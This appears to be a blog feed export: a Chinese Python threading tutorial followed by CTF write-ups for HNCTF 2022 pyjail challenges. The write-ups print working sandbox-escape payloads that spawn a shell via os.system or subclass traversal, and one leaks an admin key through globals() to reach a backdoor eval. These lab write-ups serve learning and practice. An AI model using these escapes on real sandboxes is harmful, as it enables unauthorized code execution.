class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">mythread</span>(threading.Thread):<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>       <span class="hljs-built_in">print</span>(i)<br>t1=mythread();<br>t2=mythread();<br>t1.start()<br>t2.start()<br><br><br><br></code></pre></td></tr></table></figure></li></ol><h4 id="主线程"><a href="#主线程" class="headerlink" title="主线程"></a>主线程</h4><p>第一个启动的线程就是主线程</p><p>父线程： 启动A线程中启动了线程B，A就是B的父线程</p><p>子线程：B就是A的子线程。</p><p>创建线程时有一个damon属性，用它来判断主线程。当daemon设置False时，线程不会随主线程退出而退出，主线程会一直等着子线程执行完;。当daemon设置True时，线程会随主线程退出而退出，主线程结束其他的子线程会强制退出。</p><h4 id="阻塞线程"><a href="#阻塞线程" class="headerlink" title="阻塞线程"></a>阻塞线程</h4><p>在一个线程中调用另一个线程的join方法，调用者被阻塞，知道调用线程被终止。</p><p>语法形式：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">join</span><span class="hljs-params">(timeout -= None)</span></span><br></code></pre></td></tr></table></figure><p>不设置时，就一直等待被调用线程结束。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">mythread</span>(threading.Thread):<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>       <span class="hljs-built_in">print</span>(i)<br>t1=mythread()<br>t1.start()<br>t1.join()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hello&quot;</span>)<br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hello</span>将会在输出玩<span class="hljs-number">0</span>-<span class="hljs-number">9</span>后再输出<br></code></pre></td></tr></table></figure><h4 id="判断主线程是否活动"><a href="#判断主线程是否活动" class="headerlink" title="判断主线程是否活动"></a>判断主线程是否活动</h4><p>run() ：表示线程活动的方法</p><p>start() ：启动线程</p><p>join() ：等待线程终止</p><p>isAlive() ：返回线程是否活动</p><p>getAame() ：返回线程名称</p><p>setName() ：设置线程名称</p><h4 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h4><h5 id="python的锁就解决这一问题，锁住线程，只允许一个线程操作，其他线程排队等待，待当前线程操作完毕后，再按顺序一个一个来运行。"><a href="#python的锁就解决这一问题，锁住线程，只允许一个线程操作，其他线程排队等待，待当前线程操作完毕后，再按顺序一个一个来运行。" class="headerlink" title="python的锁就解决这一问题，锁住线程，只允许一个线程操作，其他线程排队等待，待当前线程操作完毕后，再按顺序一个一个来运行。"></a>python的锁就解决这一问题，锁住线程，只允许一个线程操作，其他线程排队等待，待当前线程操作完毕后，再按顺序一个一个来运行。</h5><h5 id="python中的锁："><a href="#python中的锁：" class="headerlink" title="python中的锁："></a>python中的锁：</h5><p>python的threading模块提供了RLock锁解决方法。在某一时间只能让一个线程操作的语句放到RLock的acquire方法和release方法之间，即acquire相当于给RLack上锁，而release相当于解锁</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">mythread</span>(threading.Thread):<br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>  <span class="hljs-keyword">global</span> x                   <span class="hljs-comment">#声明一个全局变量</span><br>  lock.acquire()             <span class="hljs-comment">#上锁</span><br>  x +=<span class="hljs-number">10</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s:%d&#x27;</span>%(self.name,x))<br>  lock.release()             <span class="hljs-comment">#解锁</span><br>x = <span class="hljs-number">0</span>                        <span class="hljs-comment">#设置全局变量初始值</span><br>lock = threading.RLock()     <span class="hljs-comment">#创建可重入锁</span><br>list1 = []                   <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):   <br> list1.append(mythread())    <span class="hljs-comment">#创建五个线程，放到同一列表中</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br> i.start()                   <span class="hljs-comment">#开启列表线程</span><br><br></code></pre></td></tr></table></figure><h5 id="python中的条件锁"><a href="#python中的条件锁" class="headerlink" title="python中的条件锁"></a>python中的条件锁</h5><h6 id="threading-Condition-lock-None"><a href="#threading-Condition-lock-None" class="headerlink" title="threading.Condition(lock&#x3D;None)"></a>threading.Condition(lock&#x3D;None)</h6><p>实现条件对象的类。它具有如下方法：</p><ul><li>acquire(*args)：请求底层锁。</li><li>release()：释放底层锁。</li><li>wait(timeout&#x3D;None)：等待直到被通知或发生超时。</li><li>wait_for(predicate, timeout&#x3D;None)：等待直到条件计算为 True，predicate 是一个可调用对象且它的返回值可被解释为一个布尔值。</li><li>notify(n&#x3D;1)：默认唤醒一个等待该条件的线程。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python沙箱逃逸</title>
      <link href="/2024/03/12/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/03/12/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>之前了解了一下pyjail，本文来详细记载一下python沙箱逃逸</p><h3 id="Python-沙箱"><a href="#Python-沙箱" class="headerlink" title="Python 沙箱"></a>Python 沙箱</h3><p>所谓的Python沙箱，即以一定的方法模拟Python终端，实现用户对Python的使用。</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyjail下</title>
      <link href="/2024/03/04/Pyjail%E4%B8%8B/"/>
      <url>/2024/03/04/Pyjail%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28780</span><br><br>  _                _                           _       _ _ _                _ _____<br> | |              (_)                         (_)     (_) | |              | | ____|<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/<br>              __/ |                          _/ |<br>             |___/                          |__/                                       <br><br><br>It<span class="hljs-string">&#x27;s so easy challenge!</span><br><span class="hljs-string">Seems flag into the dir()</span><br><span class="hljs-string">&gt; __import__(&#x27;</span>os<span class="hljs-string">&#x27;).system(&#x27;</span>sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>__pycache__  flag  load_flag.py  server.py<br>$ cat flag<br>flag=NSSCTF&#123;9f2a7297-f41f-4c04-896d-9384cc5e1b49&#125;<br><br></code></pre></td></tr></table></figure><h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-1-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-1-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)</h3><p>先试一下 上一个的payload，发现import未被定义。</p><p>而dir()发现[‘<strong>builtins</strong>‘, ‘my_flag’]，则builtins还在</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28475</span><br><br>  _                _                           _       _ _ _                _ _____ __<br> | |              (_)                         (_)     (_) | |              | | ____/_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  | |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \ | |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) || |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>It<span class="hljs-string">&#x27;s so easy challenge!</span><br><span class="hljs-string">Seems flag into the dir()</span><br><span class="hljs-string">&gt; __builtins__</span><br><span class="hljs-string">Traceback (most recent call last):</span><br><span class="hljs-string">  File &quot;/home/ctf/./server.py&quot;, line 42, in &lt;module&gt;</span><br><span class="hljs-string">  File &quot;/home/ctf/./server.py&quot;, line 31, in main</span><br><span class="hljs-string">  File &quot;/home/ctf/./server.py&quot;, line 39, in repl</span><br><span class="hljs-string">  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="hljs-string">  File &quot;/usr/lib/python3.10/_sitebuiltins.py&quot;, line 61, in __repr__</span><br><span class="hljs-string">  File &quot;/usr/lib/python3.10/_sitebuiltins.py&quot;, line 50, in __setup</span><br><span class="hljs-string">NameError: name &#x27;</span><span class="hljs-built_in">open</span><span class="hljs-string">&#x27; is not defined</span><br></code></pre></td></tr></table></figure><p>发现open被删了</p><p>那就Show subclasses with tuple</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28475</span><br><br>  _                _                           _       _ _ _                _ _____ __<br> | |              (_)                         (_)     (_) | |              | | ____/_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  | |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \ | |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) || |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>It<span class="hljs-string">&#x27;s so easy challenge!</span><br><span class="hljs-string">Seems flag into the dir()</span><br><span class="hljs-string">&gt; ().__class__.__base__.__subclasses__()</span><br></code></pre></td></tr></table></figure><p>在倒数第六个发现 &lt;class ‘os._wrap_close’&gt;</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28475</span><br><br>  _                _                           _       _ _ _                _ _____ __<br> | |              (_)                         (_)     (_) | |              | | ____/_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  | |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \ | |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) || |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>It<span class="hljs-string">&#x27;s so easy challenge!</span><br><span class="hljs-string">Seems flag into the dir()</span><br><span class="hljs-string">&gt; ().__class__.__base__.__subclasses__()[-6].__init__.__globals__[&#x27;</span>system<span class="hljs-string">&#x27;](&#x27;</span>sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>__pycache__  flag  load_flag.py  server.py<br>$ cat  flag<br>flag=NSSCTF&#123;18906d38-0c29-415c-bfd6-3c1dcd9bb031&#125;<br></code></pre></td></tr></table></figure><h3 id="HNCTF-2022-Week1-lake-lake-lake-JAIL"><a href="#HNCTF-2022-Week1-lake-lake-lake-JAIL" class="headerlink" title="[HNCTF 2022 Week1]lake lake lake(JAIL)"></a>[HNCTF 2022 Week1]lake lake lake(JAIL)</h3><p>得到附件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#it seems have a backdoor</span><br><span class="hljs-comment">#can u find the key of it and use the backdoor</span><br><br>fake_key_var_in_the_local_but_real_in_the_remote = <span class="hljs-string">&quot;[DELETED]&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(code)&gt;<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;you&#x27;re hacker!&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(code))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please enter the admin key&quot;</span>)<br>    key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):<br>        code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(code))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Nooo!!!!&quot;</span>)<br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _       _          _       _          _       _        </span><br><span class="hljs-string"> | |     | |        | |     | |        | |     | |       </span><br><span class="hljs-string"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ </span><br><span class="hljs-string"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span><br><span class="hljs-string"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span><br><span class="hljs-string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Now the program has two functions&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;can you use dockerdoor&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1.func&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2.backdoor&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span>(input_data == <span class="hljs-string">&quot;1&quot;</span>):<br>    func()<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">elif</span>(input_data == <span class="hljs-string">&quot;2&quot;</span>):<br>    backdoor()<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not found the choice&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p>这道题的逻辑是输入1和2分别执行func函数和backdoor函数</p><p>func函数有长度限制，backdoor函数没有但是得得到key的值，key显然是一个全局变量，你在func函数输入globals</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28632</span><br><br>  _       _          _       _          _       _<br> | |     | |        | |     | |        | |     | |<br> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____<br> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _  | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/<br> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|<br><br><br>Now the program has two functions<br>can you use dockerdoor<br><span class="hljs-number">1.</span>func<br><span class="hljs-number">2.</span>backdoor<br>&gt; <span class="hljs-number">1</span><br>&gt;<span class="hljs-built_in">globals</span>()<br>&#123;<span class="hljs-string">&#x27;__name__&#x27;</span>: <span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f5d28848a90</span>&gt;, <span class="hljs-string">&#x27;__spec__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;, <span class="hljs-string">&#x27;__file__&#x27;</span>: <span class="hljs-string">&#x27;/home/ctf/./server.py&#x27;</span>, <span class="hljs-string">&#x27;__cached__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;key_9b1d015375213e21&#x27;</span>: <span class="hljs-string">&#x27;a34af94e88aed5c34fb5ccfe08cd14ab&#x27;</span>, <span class="hljs-string">&#x27;func&#x27;</span>: &lt;function func at <span class="hljs-number">0x7f5d289e7d90</span>&gt;, <span class="hljs-string">&#x27;backdoor&#x27;</span>: &lt;function backdoor at <span class="hljs-number">0x7f5d288a9fc0</span>&gt;, <span class="hljs-string">&#x27;WELCOME&#x27;</span>: <span class="hljs-string">&#x27;\n  _       _          _       _          _       _        \n | |     | |        | |     | |        | |     | |       \n | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ \n | |/ _` | |/ / _ \\ | |/ _` | |/ / _ \\ | |/ _` | |/ / _  | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/\n |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___|</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            \n&#x27;</span>, <span class="hljs-string">&#x27;input_data&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>得到key’的值： ‘a34af94e88aed5c34fb5ccfe08cd14ab’</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py"><br>nc node5.anna.nssctf.cn <span class="hljs-number">28632</span><br><br>  _       _          _       _          _       _<br> | |     | |        | |     | |        | |     | |<br> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____<br> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _  | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/<br> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|<br><br><br>Now the program has two functions<br>can you use dockerdoor<br><span class="hljs-number">1.</span>func<br><span class="hljs-number">2.</span>backdoor<br>&gt; <span class="hljs-number">2</span><br>Please enter the admin key<br>&gt;a34af94e88aed5c34fb5ccfe08cd14ab<br>&gt;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;sh&#x27;</span>)<br>sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">flag  server.py</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">flag=NSSCTF&#123;da5f4f8a-3839-4c3c-9dd6-60de30fe299e&#125;</span><br></code></pre></td></tr></table></figure><h3 id="HNCTF-2022-Week1-l-ke-l-ke-l-ke-JAIL"><a href="#HNCTF-2022-Week1-l-ke-l-ke-l-ke-JAIL" class="headerlink" title="[HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)"></a>[HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#it seems have a backdoor as `lake lake lake`</span><br><span class="hljs-comment">#but it seems be limited!</span><br><span class="hljs-comment">#can u find the key of it and use the backdoor</span><br><br>fake_key_var_in_the_local_but_real_in_the_remote = <span class="hljs-string">&quot;[DELETED]&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(code)&gt;<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;you&#x27;re hacker!&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(code))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please enter the admin key&quot;</span>)<br>    key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):<br>        code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(code))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Nooo!!!!&quot;</span>)<br><br>WELCOME = <span 